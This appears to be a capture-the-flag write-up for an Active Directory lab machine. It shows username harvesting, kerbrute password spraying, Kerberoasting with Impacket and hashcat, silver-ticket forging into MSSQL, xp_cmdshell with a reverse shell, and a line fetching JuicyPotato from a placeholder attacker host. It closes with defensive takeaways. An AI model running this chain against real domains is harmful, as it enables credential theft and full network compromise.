# Scrambled (Medium)

Username harvesting from a corporate intranet site, Kerberos-only Kerberoasting, silver-ticket forging into MSSQL, and a custom-binary secret decryption for lateral movement.

## Enumeration

```bash
nmap -p- -sC -sV <target>
```

```
53/tcp   open domain
80/tcp   open http          "Scramble Corp Intranet"
88/tcp   open kerberos-sec  (Domain: scrm.local)
135/tcp  open msrpc
139/tcp  open netbios-ssn
389/tcp  open ldap          (cert CN=DC1.scrm.local)
445/tcp  open microsoft-ds?
464/tcp  open kpasswd5?
593/tcp  open ncacn_http
636/tcp  open ssl/ldap
1433/tcp open ms-sql-s      Microsoft SQL Server 2019
3268/tcp open ldap
3269/tcp open ssl/ldap
```

The intranet's "IT Support" contact page and EXIF metadata on hosted images leaked employee usernames.

## Foothold — Kerbrute + password spray + Kerberoasting over Kerberos auth

```bash
kerbrute usernum --dc <target> -d scrm.local users.txt
kerbrute passwordspray --dc scrm.local -d scrm.local users.txt <candidate_password>
```

One username/password pair matched (redacted — `<REDACTED>`). SMB login required a Kerberos ticket rather than NTLM, so a TGT was requested via Impacket before any SMB/Kerberoast activity:

```bash
getTGT.py -dc-ip <target> scrm.local/<user>:<REDACTED>
export KRB5CCNAME=<user>.ccache
GetUserSPNs.py scrm.local/<user>:<REDACTED> -dc-host DC1.scrm.local -k -no-pass -request
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

## Lateral movement — Forging a silver ticket for MSSQL

With a cracked service account NTLM hash and the domain SID:

```bash
getPAC.py -targetUser administrator scrm.local/<user>:<REDACTED>
```

```bash
ticketer.py -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash <REDACTED> -domain-sid <REDACTED> -domain scrm.local
export KRB5CCNAME=Administrator.ccache
mssqlclient.py dc1.scrm.local -k
```

> Forged (silver) tickets default to a very long lifetime — always shorten the validity window in a real engagement; a 10-year TGT is a loud IOC.

As "Administrator" in the SQL session:

```sql
enable_xp_cmdshell
```

A Nishang reverse shell (base64/UTF-16LE encoded) was executed via `xp_cmdshell` to get a shell, then `JuicyPotatoNG` was used to abuse `SeImpersonatePrivilege` for a SYSTEM shell:

```powershell
curl <attacker>/JuicyPotato.exe
.\jp.exe -t * -p C:\programdata\t.bat
```

## Alternate path — Reverse-engineering a custom audit tool

A separate `ScrambleHR` database table (`UserImport`) held another service account's credentials (redacted) that required fixing the local Kerberos realm config (`/etc/krb5.conf`) to authenticate.

A `CascAudit`-style custom tool on another share stored a password encrypted with a hardcoded key, recoverable by reverse engineering the binary (dnSpy) or by driving the tool's own decrypt routine against the captured ciphertext — no values reproduced here.

## Takeaways

- Boxes requiring Kerberos (not NTLM) auth need `getTGT.py` + `KRB5CCNAME` before any further Impacket tooling will work.
- A cracked service-account hash + known domain SID is enough to forge a Silver Ticket for any SPN that account services — always minimize what SPNs a single account owns.
- Custom-compiled "security" tooling that encrypts secrets with a hardcoded key is a weaker control than it looks — reverse it once with dnSpy/ILSpy and the key is reusable forever.
